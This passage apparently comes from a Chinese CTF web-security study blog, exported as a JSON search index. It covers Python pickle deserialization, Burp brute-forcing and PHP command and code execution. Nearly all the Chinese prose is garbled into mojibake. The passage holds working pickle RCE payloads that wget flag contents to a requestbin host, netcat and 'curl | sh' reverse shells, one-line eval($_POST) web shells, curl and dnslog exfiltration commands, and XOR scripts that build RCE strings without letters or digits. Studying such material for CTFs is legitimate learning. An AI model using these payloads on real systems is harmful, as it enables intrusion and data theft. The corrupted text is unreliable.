Demo()pickle.loads(pickle.dumps(demo))\n\n\né˜²å¾¡æ–¹æ³•\né‡‡ç”¨ç”¨æ›´é«˜çº§çš„æ¥å£__getnewargs()ã€__getstate__()ã€__setstate__()ç­‰ä»£æ›¿__reduce__()é­”æœ¯æ–¹æ³•\nè¿›è¡Œååºåˆ—åŒ–æ“ä½œä¹‹å‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤, è‹¥é‡‡ç”¨çš„æ˜¯pickleåº“å¯é‡‡ç”¨è£…é¥°å™¨å®ç°\nåœ¨ä¼ é€’åºåˆ—åŒ–å¯¹è±¡å‰è¯·è¿›è¡Œç­¾åæˆ–è€…åŠ å¯†ï¼Œé˜²æ­¢ç¯¡æ”¹å’Œé‡æ’­\nå¦‚æœåºåˆ—åŒ–æ•°æ®å­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼Œè¯·ç¡®ä¿ä¸å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ä¸èƒ½ä¿®æ”¹ã€è¦†ç›–æˆ–è€…é‡æ–°åˆ›å»ºè‡ªå·±çš„åºåˆ—åŒ–æ•°æ®\nä¸è¦å†ä¸å®ˆä¿¡ä»»çš„é€šé“ä¸­ä¼ é€’ pcikle åºåˆ—åŒ–å¯¹è±¡\nå°† pickle åŠ è½½çš„æ•°æ®åˆ—å…¥ç™½åå•\n\nåšä¿©é¢˜è¿™é‡Œå¼€ä¸ªctfshowçš„web277å’Œweb278åšä¸€åš\næºç ä¸­å¯ä»¥çœ‹åˆ°hint\nç„¶åè¿™é‡Œæˆ‘ä»¬å°è¯•æ„é€ ä¸€ä¸‹payload\nimport base64import pickleimport osclass Demo(object):    def __reduce__(self):        shell = &#x27;whoami&#x27;        return (os.system,(shell,))demo = Demo()payload = pickle.dumps(demo)print(base64.b64encode(payload))\n\n\nå¹¶æ²¡æœ‰æ‰“é€š, å°è¯•dnså¤–å¸¦ä¹Ÿä¸è¡Œ, è¿™é‡Œçœ‹ç½‘ä¸Šå¤§ä½¬æä¾›äº†ä¸€ç§ RequestBinæ–¹æ³•, è¿™é‡Œå€Ÿç”¨buuçš„requestbinå¹³å°\nimport base64import pickleimport osclass Demo(object):    def __reduce__(self):        #shell = &#x27;wget `id|base64`.wjqfgx.dnslog.cn&#x27;        shell = &#x27;wget http://http.requestbin.buuoj.cn/1h6hdxc1?c=`cat fla*`&#x27;        return (os.system, (shell,))demo = Demo()payload = pickle.dumps(demo)print(base64.b64encode(payload))\n\né¢â€¦è¿™é‡Œæˆ‘ä¹Ÿæ²¡å¸¦å‡ºæ¥\né‚£ä¹ˆè¿™äºŒè€…æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢, è™½ç„¶ç»“æœæ˜¯éƒ½æ²¡å¸¦å‡ºæ¥\n\nRequestBinå’ŒDNSLogéƒ½æ˜¯ç”¨äºæµ‹è¯•å’Œè°ƒè¯•ç½‘ç»œåº”ç”¨ç¨‹åºçš„å·¥å…·ï¼Œä½†å®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨äºå®ƒä»¬æ‰€è®°å½•çš„ä¿¡æ¯ç±»å‹ã€‚\nRequestBinå¤–å¸¦æ˜¯ä¸€ç§HTTPè¯·æ±‚æ•è·å·¥å…·ï¼Œå¯ä»¥æ•è·æ¥è‡ªä»»ä½•æ¥æºçš„HTTPè¯·æ±‚ï¼Œå¹¶ä¸ºæ‚¨æä¾›ä¸€ä¸ªä¸´æ—¶ç½‘å€ï¼Œåœ¨è¿™ä¸ªç½‘å€ä¸Šï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯·æ±‚å¤´ã€è¯·æ±‚å‚æ•°ç­‰ã€‚RequestBinå¤–å¸¦é€šå¸¸ç”¨äºæµ‹è¯•Webhookä»¥åŠä¸ç¬¬ä¸‰æ–¹APIçš„äº¤äº’ç­‰ã€‚\nDNSLogå¤–å¸¦åˆ™æ˜¯ä¸€ç§ç”¨äºæ•è·DNSè¯·æ±‚çš„å·¥å…·ï¼Œå®ƒå¯ä»¥æ•è·é€šè¿‡æ‚¨æŒ‡å®šçš„DNSæœåŠ¡å™¨å‘é€çš„æ‰€æœ‰DNSè¯·æ±‚ï¼Œå¹¶å°†å…¶è®°å½•ä¸‹æ¥ã€‚DNSLogå¤–å¸¦é€šå¸¸ç”¨äºå‘ç°æ¶æ„è½¯ä»¶å’Œç½‘ç»œæ”»å‡»ï¼Œä¾‹å¦‚åŸŸååŠ«æŒã€DNSæŠ•æ¯’ç­‰æƒ…å†µã€‚\nRequestBiné€‚ç”¨äºæ£€æŸ¥HTTPè¯·æ±‚ï¼Œè€ŒDNSLogé€‚ç”¨äºæ£€æŸ¥æ‰€æœ‰ç±»å‹çš„ç½‘ç»œè¯·æ±‚ã€‚RequestBinéœ€è¦å‘å¤–éƒ¨æœåŠ¡å™¨å‘é€è¯·æ±‚æ¥è·å–è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯ï¼Œè€ŒDNSLogåˆ™ä¸éœ€è¦è¿æ¥åˆ°å¤–éƒ¨æœåŠ¡å™¨å³å¯æ•è·ç½‘ç»œè¯·æ±‚ã€‚\n\nè¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ç¬¬ä¸‰ç§æ–¹æ³•, åå¼¹shellä¹Ÿå¤±è´¥, é‚£ä¹ˆå°±å¯èƒ½æ˜¯æˆ‘ä»¬payloadçš„é—®é¢˜äº†, æœ‰å¯èƒ½æ˜¯æ²¡æœ‰systemæ¨¡å—, è¿™é‡Œæˆ‘ä»¬æ¢ä¸€ä¸ªpayload\nimport pickleimport osimport base64class Demo():    def __reduce__(self):        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;wget http://http.requestbin.buuoj.cn/1h6hdxc1?c=`cat fla*`&#x27;).read()&quot;,))        #return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc ip port -e /bin/sh&#x27;).read()&quot;,))demo = Demo()ctf = pickle.dumps(demo)#df = pickle.loads(demo)print(base64.b64encode(ctf))\n\nè¯•äº†å‡ æ¬¡ä¸èƒ½ç”¨bash,æœ€åç”¨äº†/bin/sh,å› ä¸ºç¯å¢ƒé‡Œé¢æ²¡æœ‰è£…bash,å¾—ä¸åˆ°å“åº”ncè¿ä¸Šå°±ä¼šè‡ªåŠ¨æ–­å¼€\n\n\n","tags":["Web","Study","Python","SSTI","Flask","pickle","pyååºåˆ—åŒ–"]},{"title":"Web_1_ç®€å•ä¿¡æ¯æœé›†+burpåŸºæœ¬ä½¿ç”¨","url":"/2022/09/02/web_1/","content":"ç¬¬ä¸€èŠ‚  åˆå§‹åŒ–å­¦ä¹ 0x1ç»™è‡ªå·±èµ·ä¸€ä¸ªå“äº®çš„èŠ±å0x2åˆ†é˜Ÿä¸¤é˜Ÿäº’ç›¸æ¿€åŠ±\n0x3è®°ç¬”è®°/blogwananå¸ˆå‚…æ•™æ­å»ºblogäº†ï¼Œåº”è¯¥å·²ç»æ­å¥½äº†\n0x4ç¯å¢ƒ&amp;&amp;çº¦å®šç¯å¢ƒæœ‰ä¸€å°ç”µè„‘\nçº¦å®šflag é¢˜ç›®ç­”æ¡ˆ\npoc æ¼æ´æ¼”ç¤ºï¼Œä¸å…·æœ‰å·¥å…·æ€§\nexp ç›´æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨\nè„šæœ¬ è‡ªåŠ¨åŒ–ä»£ç \nç¬¬äºŒèŠ‚ è®¤è¯†æ¼æ´0x1 ä»€ä¹ˆæ˜¯æ¼æ´WEBæ¼æ´é€šå¸¸æ˜¯æŒ‡ç½‘ç«™ç¨‹åºä¸Šçš„æ¼æ´ï¼Œå¯èƒ½æ˜¯ç”±äºä»£ç ç¼–å†™è€…åœ¨ç¼–å†™ä»£ç æ—¶è€ƒè™‘ä¸å‘¨å…¨ç­‰åŸå› è€Œé€ æˆçš„æ¼æ´ï¼Œå¸¸è§çš„WEBæ¼æ´æœ‰Sqlæ³¨å…¥ã€Xssæ¼æ´ã€ä¸Šä¼ æ¼æ´ç­‰ã€‚\næ‘˜è‡ªç™¾åº¦ç™¾ç§‘\n0x2 æ¼æ´äº§ç”Ÿçš„åŸå› 0x3 æ¼æ´çš„åˆ©ç”¨\n0x4 åšé¢˜æ€è·¯ç¬¬ä¸€æ­¥å…ˆæ–‡ä»¶è¯»å–ï¼Œå†æ–‡ä»¶å†™å…¥ï¼Œå†å‘½ä»¤æ‰§è¡Œ\nç¬¬äºŒæ­¥åˆ¤æ–­æ¼æ´ç±»å‹\nç¬¬ä¸‰æ­¥æ‰¾flag\nç¬¬ä¸‰èŠ‚ ä¿¡æ¯æ³„éœ²0x1 ç±»å‹\n0x2 æ¼æ´åˆ©ç”¨1 httpå¤´éƒ¨ä¿¡æ¯\nbaidu.com/1.jsp\nF12 å¯ä»¥çœ‹åˆ°å‰ç«¯å¯èƒ½æ˜¯é˜¿å¸•å¥‡\nbaiducom/index.php\nserver æˆä¸ºäº† BWS/1.1\n2 æŠ¥é”™ä¿¡æ¯3 é¡µé¢ä¿¡æ¯4 robots.txté˜²å›å­ä¸é˜²å°äºº\næ­¤åœ°æ— é“¶ä¸‰ç™¾ä¸¤\n5 .gitgithack\nä½¿ç”¨æ–¹æ³•\npython githack.py http://charmersix.icu/.git/\nè·‘å®Œä¹‹åä¼šåœ¨æœ¬åœ°ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œè¾¹æœ‰é‡è¦ä¿¡æ¯\n/.git/ 403è¡¨ç¤ºæ­¤ç›®å½•å­˜åœ¨\n\n\nbuué¢˜ç›®Nu1l\nç¬¬å››èŠ‚ burp suiteæŠ“åŒ…ï¼Œçˆ†ç ´\nbpçš„å®‰è£…ï¼ŒJavaç¯å¢ƒï¼Œproxyæ’ä»¶\nè®¾ç½®å¥½ä»£ç†ï¼Œå¼€å¯æ‹¦æˆªï¼Œåˆ·æ–°ä¸€ä¸‹ä½ çš„æµè§ˆå™¨å°±å¯ä»¥çœ‹è§æŠ“åˆ°çš„åŒ…\nè¿™é‡Œæˆ‘ä»¬ä»¥bugkuçš„ä¸€ä¸ªé¢˜ç›®ä¸ºä¾‹å­ï¼Œæ¼”ç¤ºä¸€ä¸‹ä½¿ç”¨bpè¿›è¡Œçˆ†ç ´\né¢˜ç›®é“¾æ¥\nç°åœ¨æˆ‘ä»¬æ‰“å¼€é¢˜ç›®ï¼Œå¼€å¯æ‹¦æˆª\n\nç„¶åæˆ‘ä»¬å¾€é‡Œå¡«ä¸€ä¸ªè‡ªå·±çŒœçš„å¯†ç ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œæ˜¯123456\nç‚¹æäº¤ï¼Œå°±èƒ½çœ‹è§è‡ªå·±æŠ“çš„åŒ…\n\nè¿™é‡Œå¯ä»¥çœ‹è§æˆ‘ä»¬å·²ç»æŠ“åˆ°äº†ï¼Œæˆ‘ä»¬ç‚¹é¼ æ ‡å³é”®ï¼Œå‘é€åˆ°intruder\næ¥åˆ°ä½ç½®è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æŠŠadminä½ç½®åˆ æ‰ï¼Œå› ä¸ºä¸€å¼€å§‹adminç»™å‡ºäº†ï¼Œä¸éœ€è¦æˆ‘ä»¬çˆ†ç ´\nåªéœ€è¦åˆ é™¤adminä¸¤è¾¹çš„Â§ç¬¦å·å³å¯\næˆ‘ä»¬ç»§ç»­çœ‹ä¸‹ä¸€æ \n\nè¿™é‡Œé€‰æ‹©ç®€å•åˆ—è¡¨å³å¯ï¼Œç„¶åå¯¼å…¥æˆ‘ä»¬ä»ç½‘ä¸Šä¸‹è½½çš„top1000å¯†ç ï¼Œå¼€å§‹çˆ†ç ´\nå¤±è´¥\né€šè¿‡è§‚å¯Ÿç›¸åº”åŒ…ï¼Œæˆ‘ä»¬å‘ç°ï¼Œæ— è®ºæ˜¯å¦çˆ†ç ´æˆåŠŸï¼Œè¿™é‡Œéƒ½ä¼šé€šè¿‡jså‘Šè¯‰ä½ çˆ†ç ´å¤±è´¥\né‚£æˆ‘ä¹ˆåªéœ€è¦è¿‡æ»¤æ‰&#123;code: &#39;bugku10000&#39;&#125;å°±èƒ½çŸ¥é“ï¼Œåˆ°åº•å“ªä¸ªæ˜¯çœŸæ­£è¢«çˆ†ç ´æˆåŠŸçš„\n\nç„¶åçˆ†ç ´ï¼Œå°±èƒ½å‡ºå¯†ç \n","tags":["Web","Study","burpsuite","F12"]},{"title":"Web_2_PHPå‘½ä»¤æ‰§è¡Œ+ä»£ç æ‰§è¡Œ","url":"/2022/09/07/web_2/","content":"ç¬¬ä¸€èŠ‚ phpçš„åŸºç¡€çŸ¥è¯†0x1 phpçš„åŸºæœ¬æ¦‚å¿µphpæ˜¯ç½‘ç«™çš„ä¸€ç§è„šæœ¬è¯­è¨€ï¼Œæ–‡ä»¶åç¼€æ˜¯phpï¼Œç”¨æ¥å†™ç½‘ç«™ï¼Œé€‚åˆä¸­å°å‹ç½‘ç«™çš„å¼€å‘ã€‚\n0x2 phpç¯å¢ƒçš„å®‰è£…php çš„è¿è¡Œç¯å¢ƒphpstudy\nphp çš„å¼€å‘ç¯å¢ƒ? åŒºåˆ†æ–‡ä»¶å’Œå‚æ•°éƒ¨åˆ†\nå‚æ•°éƒ¨åˆ† ç”¨ &amp; åŒºåˆ† å¤šä¸ªé”®å€¼å¯¹\nå•ä¸ªé”®å€¼å¯¹ç”¨ = åˆ†å¼€\n0x3 phpå†™ä¸€ä¸ªhello world&lt;?phpecho &quot;hello world&quot;;?&gt;\n\n0x3 phpåŸºç¡€è¯­æ³•$_GET&lt;?php$a=$_GET[&#x27;a&#x27;];echo $a?&gt;\n\n$_POST&lt;?php$a=$_POST[&#x27;a&#x27;];echo $a?&gt;\n$_REQUEST&lt;?phpeval($_REQUEST[1]);?&gt;\n\nå½“getå’Œpostå‡½æ•°è¢«ç¦ç”¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨requestå‡½æ•°\nå‡½æ•°&lt;?phpfunction add($a,$b)&#123;  return $a+$b;&#125;$a=$_POST[&#x27;a&#x27;];$b=$_POST[&#x27;b&#x27;];$c=add($a,$b);echo $c;?&gt;\n\nå±é™©å‡½æ•°&lt;?php$cmd=$_POST[&#x27;cmd&#x27;];system($cmd);?&gt;\n\nç¬¬äºŒèŠ‚ phpçš„å‘½ä»¤æ‰§è¡Œ0x1 ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡ŒRCE\n0x2 phpçš„command execå‡½æ•°PHPå®˜æ–¹æœ‰ä¸‹é¢å…­ç§å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤\n\nsystem\npassthru\nexec\nshell_exec\npopen\npcntl_exec4\næ‰§è¡Œè¿ç®—ç¬¦\necho ``?&gt;\n\n0x3 phpçš„å‘½ä»¤æ‰§è¡Œåˆ©ç”¨phpçš„å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬é»˜è®¤è®¨è®ºçš„æ˜¯æœåŠ¡å™¨ç³»ç»Ÿä¸ºLinux\nshell çš„åˆ†å· ; å¯ä»¥ç”¨æ¥åˆ†å‰²ä¸¤æ¡å‘½ä»¤\nå¹¶åˆ—å‘½ä»¤&amp;&amp;çš„urlç¼–ç (%26%26) ä¹Ÿå¯ä»¥åˆ†å‰²ä¸¤æ¡å‘½ä»¤   but &amp;&amp;å‰çš„å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œåé¢çš„æ‰ä¼šæˆç«‹\n|| è¡¨ç¤ºæˆ– ï¼Œ å¯ä»¥åˆ†å‰²ä¸¤æ¡å‘½ä»¤\nerror_reporting(0); //ä¸æ˜¾ç¤ºæŠ¥é”™highlight_file(__FILE__); //ä»£ç é«˜äº®\n\nç»•è¿‡base64ç¼–ç ç»•è¿‡å¦‚æœ flag/cat ç­‰å‘½ä»¤è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™ã€å…¶ä»–æœªè¢«è¿‡æ»¤å‘½ä»¤ã€base64ç¼–ç è§£ç \n`echo dGFjIGZsYWcucGhw | base64 -d`\n\n\nåœ¨linuxå½“ä¸­åå¼•å·ä¹Ÿååˆ†å¸¸ç”¨ï¼Œä¹Ÿå°±æ˜¯ ` ç¬¦å·ã€‚é‚£ä¹ˆåå¼•å·æ˜¯æ€ä¹ˆä½¿ç”¨çš„å‘¢ï¼Ÿæˆ‘çš„ç†è§£æ˜¯å‡¡æ˜¯æ‰“ä¸Šåå¼•å·çš„å‘½ä»¤ï¼Œé¦–å…ˆå°†åå¼•å·å†…çš„å‘½ä»¤æ‰§è¡Œä¸€æ¬¡ï¼Œç„¶åå†å°†å·²ç»æ‰§è¡Œè¿‡çš„å‘½ä»¤å¾—åˆ°çš„ç»“æœå†æ‰§è¡Œä¸€æ¬¡ï¼Œå°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬åå¼•å·çš„è¾“å‡º\n\nå˜é‡æ‹¼æ¥ç»•è¿‡å…³é”®å­—a=c;b=at;c=fla;d=g.php;$a$b $&#123;c&#125;$&#123;d&#125;\n\nçˆ†ç ´è¢«è¿‡æ»¤çš„ç¬¦å·ç¬¦å·è¢«è¿‡æ»¤å¯ä»¥çˆ†ç ´ä¸€ä¸‹ï¼Œ\n\n\nå¯ä»¥ä½¿ç”¨{}å’Œå†’å·: æˆªå–ç©ºæ ¼\nä½¿ç”¨envæµè§ˆç¯å¢ƒå˜é‡ï¼Œç„¶åæˆªå–\nä¾‹å¦‚GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D\ncmd=tac$&#123;GPG_KEYS:40:1&#125;*\nä¸å›æ˜¾æ²¡åŠæ³•ç›´æ¥çœ‹åˆ°å›æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨å†™æ–‡ä»¶çš„æ–¹å¼ï¼Œå°†ç»“æœå†™åˆ°æµè§ˆå™¨å¯ä»¥è¯»å–çš„ä½ç½®ï¼Œç„¶åè®¿é—®url+1.txt\nå†™å…¥æ–‡ä»¶å¯ä»¥ç”¨ &gt; å†™å…¥\ndnsé€šé“http://www.dnslog.cn/\nå½“æ–‡ä»¶è¿‡é•¿æ— æ³•å…¨éƒ¨å›å¸¦æ—¶ï¼Œå¯ä»¥éƒ¨åˆ†å›å¸¦ï¼Œä½¿ç”¨sed -nå‘½ä»¤\nå¯ä»¥ä½¿ç”¨\na=`sed -n &quot;3,4p&quot; fla?.php|base64`;curl $&#123;a:0:10&#125;.dnslog.cn #aä¸­ï¼Œä»0å¼€å§‹æˆªå–10ä¸ªï¼Œç„¶åä»10å†æˆªå–ï¼Œä¾æ­¤ç±»æ¨\n\nå½“dnslogè¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨\nhttps://requestrepo.com/#/\nhttps://pipedream.com/\ncurl -X POST --data a=`cat ./flag.php` http:/xxxx.com #POSTcurl http://xxx.com/?a=`whoami` #GET\n\nåå¼¹shellä»¥åŠctfshowä¸“ç”¨åå¼¹shellhttps://your-shell.com/\næ—¶é—´ç›²æ³¨ç›²æ³¨çŒœflag\nç¬¬ä¸‰èŠ‚ phpçš„ä»£ç æ‰§è¡Œ0x1 ä»€ä¹ˆæ˜¯phpçš„ä»£ç æ‰§è¡Œeval(&quot;è¦æ‰§è¡Œçš„ä»£ç &quot;); å¯ä»¥æ‰§è¡Œå‚æ•°ç»™çš„phpä»£ç \nå¯ä»¥ç”¨?&gt;ç»“æŸphpä»£ç ã€‚\n0x2 ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œçš„åŒºåˆ«\n system å‘½ä»¤æ‰§è¡Œ\n shell_exec å‘½ä»¤æ‰§è¡Œ\n eval ä»£ç æ‰§è¡Œ\n\n0x3 phpçš„ä»£ç æ‰§è¡Œæ˜¯ä»€ä¹ˆæ ¼å¼åœ¨phpè¯­è¨€ä¸­ï¼Œä»£ç åˆ†ä¸ºä¸‰ç§\n1.å‡½æ•°è°ƒç”¨\nå‡½æ•°å (å‡½æ•°å‚æ•°1ï¼Œå‡½æ•°å‚æ•°2 â€¦);\n2.ç±»æ–¹æ³•è°ƒç”¨\nç±»å®ä¾‹ ç®­å¤´ ç±»æ–¹æ³• ()\n($_GET[1])($_GET[2]); //å…æ€ä¸€å¥è¯æœ¨é©¬\n\n3.è¯­è¨€ç»“æ„è°ƒç”¨\n0x4 phpçš„ä»£ç æ‰§è¡Œåé—¨ä¸€å¥è¯æœ¨é©¬\n&lt;?phpeval($_POST[1]);?&gt; //èšå‰‘è¿æ¥\n\ngetè½¬postè½¬æ¥å¤´\n&lt;?phpeval($_GET[1]);?&gt;?1=eval($_POST[2]);\n\n0x5 ä»£ç æ‰§è¡Œçš„ç±»å‹\n(&quot;sys&quot;.&quot;tem&quot;)=system\n&lt;script language=&quot;php&quot;&gt;eval($_POST[1])&lt;/script&gt; \n\nphp5.6ç‰ˆæœ¬ä»¥å‰çš„å¯ç”¨\næœ€çŸ­æœ¨é©¬ï¼š\n&lt;?`$_GET[2]`;&amp;2=\n\nåå¼¹ shell\nnc ip port -e /bin/sh #ä¼ ç»Ÿå§¿åŠ¿curl https://your-shell.com/ip:port |sh #ctfshowæ–°å§¿åŠ¿\n\nçƒ§å§¿åŠ¿1.æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œé‡‡ç”¨æ–‡ä»¶ä¸Šä¼ çš„æ–¹å¼ï¼ŒåŒ¹é…åˆ°tempç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­å†™å…¥å‘½ä»¤æ‰§è¡Œä»£ç \nè¿™é‡Œæ¬ç”¨ä¸€ä¸‹ctfshowå¸ˆå‚…å†™çš„uploadä»£ç \n&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://é¶åœºåœ°å€/?cmd=. /???/????????[@-[]&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;upload&quot;&gt;&lt;/form&gt;\n\nåŒ¹é…ä¸´æ—¶æ–‡ä»¶ï¼Œå†™å…¥å‘½ä»¤ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ\nè¿™é‡Œå¼€ä¸€ä¸ªé¶åœºå†™ä¸€ä¸‹è¯¦ç»†è¿‡ç¨‹\nè¿™é‡Œæˆ‘ä»¬æŠŠupload.htmlæŒ‚åˆ°PHP study\nç„¶åéšä¾¿ä¼ ä¸€ä¸ª.txt\næ‰“å¼€bpï¼Œå¼€æŠ“\n\næˆ‘ä»¬å‘åˆ°repeater\nç„¶åæŠŠæˆ‘ä»¬1.txtæ–‡ä»¶ä¸­çš„å†…å®¹æ”¹æˆè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå‘åŒ…!\n\næˆåŠŸï¼Œå¦‚æœä¸æˆåŠŸå¯ä»¥å¤šå‘å‡ æ¬¡ï¼Œå› ä¸ºæˆ‘ä»¬åŒ¹é…çš„æ–‡ä»¶åæ˜¯æœªçŸ¥çš„ï¼Œèƒ½å¦æ­£ç¡®åŒ¹é…ä¹Ÿæ˜¯æ¦‚ç‡äº‹ä»¶ï¼Œå¤šå‘å‡ æ¬¡å°±ä¼šæˆåŠŸã€‚\n\n2.æ— å­—æ¯æ•°å­—ä»£ç æ‰§è¡Œè¿™é‡Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªè„šæœ¬\nä½œè€…éƒ½æ¥è‡ªç¾½å¸ˆå‚…\né¦–å…ˆæ˜¯ä¸€ä¸ªphp\n&lt;?php/*author yu22x*/$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;         for ($j=0; $j &lt;256 ; $j++) &#123;                 if($i&lt;16)&#123;                        $hex_i=&#x27;0&#x27;.dechex($i);                &#125;                else&#123;                        $hex_i=dechex($i);                &#125;                if($j&lt;16)&#123;                        $hex_j=&#x27;0&#x27;.dechex($j);                &#125;                else&#123;                        $hex_j=dechex($j);                &#125;                $preg = &#x27;/[a-z0-9]/i&#x27;; //æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                                        echo &quot;&quot;;    &#125;                  else&#123;                $a=&#x27;%&#x27;.$hex_i;                $b=&#x27;%&#x27;.$hex_j;                $c=(urldecode($a)^urldecode($b));                if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;                        $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\\n&quot;;                &#125;        &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);\n\næˆ‘ä»¬æŠŠä»–æŒ‚åœ¨PHP studyï¼Œä¼šåœ¨æœ¬åœ°ç”Ÿæˆä¸€ä¸ªxor_rce.txt\nç„¶åæ˜¯ä¸€ä¸ªpythonè„šæœ¬\n# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;^\\&quot;&quot;+s2+&quot;\\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\\n[+] your functionï¼š&quot;) )+action(input(&quot;[+] your commandï¼š&quot;))+&quot;;&quot;   print(param)\n\næˆ‘ä»¬è·‘ä¸€ä¸‹ï¼Œåœ¨functionï¼šå’Œcommandï¼šä¸‹åˆ†åˆ«å¡«å…¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤\n\nç„¶åå°±ä¼šç”Ÿæˆä¸€ä¸²å¼‚æˆ–å‡ºæ¥çš„å‘½ä»¤ï¼Œå¤åˆ¶æ‰§è¡Œå³å¯\nè¿™é‡Œçš„(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;);\nè™½ç„¶çœ‹ä¸Šå»å­˜åœ¨ä¸€äº›æ•°å­—å­—æ¯ï¼Œä½†æ˜¯éƒ½æ˜¯urlç¼–ç åçš„ï¼Œæˆ‘ä»¬å¯ä»¥è§£ç çœ‹ä¸€ä¸‹\n\n\næ˜¯ä¸€äº›ä¸å¯è§å­—ç¬¦æ˜‚\n3.å·§ç”¨èšå‰‘æ’ä»¶å½“è„šæœ¬å°å­åœ¨è¿™å¼€å§‹æˆ‘ä»¬è¦å‡†å¤‡ä¸€ä¸ªæ¯”è¾ƒæ–°çš„ä¸­å›½èšå‰‘ï¼Œä¸è¦åƒæˆ‘ä¸€æ ·ï¼Œæ‰“å¼€2016ç‰ˆçš„èšå‰‘\n\næ‰“å¼€2019ç‰ˆçš„èšå‰‘ï¼Œè‡³å°‘æ’ä»¶å•†åŸèƒ½ç”¨\nè£…å‡ ä¸ªæ’ä»¶ï¼Œè¿™æ˜¯æ¯”è¾ƒæœ‰ç”¨çš„å‡ ä¸ªï¼Œå½“ç„¶æ ¹æ®è‡ªå·±éœ€æ±‚åœ¨å•†åŸé‡Œéšä¾¿è£…\n\nè¿™é‡Œæˆ‘ä»¬ä¸å†èµ˜è¿°ä¸€å¥è¯æœ¨é©¬çš„ä¸Šä¼ ï¼Œè¿™æ—¶å€™æˆ‘ä»¬ä¸€å¥è¯å·²ç»è¿ä¸Šäº†ï¼Œä½†æ˜¯æ— è®ºæ˜¯è¯»å–flagï¼Œè¿˜æ˜¯å‘½ä»¤æ‰§è¡Œéƒ½æ²¡ç”¨\nç„¶åï¼Œæ¥åˆ°ä¸Šä¼ åçš„ææƒ/ç»•è¿‡æ“ä½œ\nåŠ è½½disable_functions,é€‰æ‹©ç¬¬ä¸€ä¸ªLD_PRELOADï¼Œå¼€å§‹\n\nèƒ½çœ‹åˆ°å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ª.antproxy.php\n\næˆ‘ä»¬ç›´æ¥è¿è¿™ä¸ªæ–‡ä»¶\n\nè¿™æ—¶å€™æˆ‘ä»¬å›åˆ°ç»ˆç«¯whoami\n\n\næ³¨æ„è¿™é‡Œä¸è¦æ‰“æˆwho m ai ğŸ‘´ï¼\n\n\nç„¶åæˆ‘ä»¬catè¯•è¯•\n\næ²¡æœ‰æƒé™ï¼Œçœ‹æ¥www-dataæƒé™è¿˜ä¸å¤Ÿï¼Œä¼šä¸ä¼šæœ‰å…¶ä»–å‘½ä»¤ï¼Œä¸ç”¨rootæƒé™ï¼Œå´èƒ½ä»£æ›¿cat\nè¿™é‡Œæ¥ä¸€äº›LinuxçŸ¥è¯†\n\nåœ¨linuxä¸‹æˆ‘ä»¬ç»å¸¸ç”¨åˆ°çš„å››ä¸ªåº”ç”¨ç¨‹åºçš„ç›®å½•æ˜¯/binã€/sbinã€/usr/binã€/usr/sbin ã€‚è€Œå››è€…å­˜æ”¾çš„æ–‡ä»¶ä¸€èˆ¬å¦‚ä¸‹ï¼š\nbinç›®å½•: \nbinä¸ºbinaryçš„ç®€å†™ä¸»è¦æ”¾ç½®ä¸€äº› 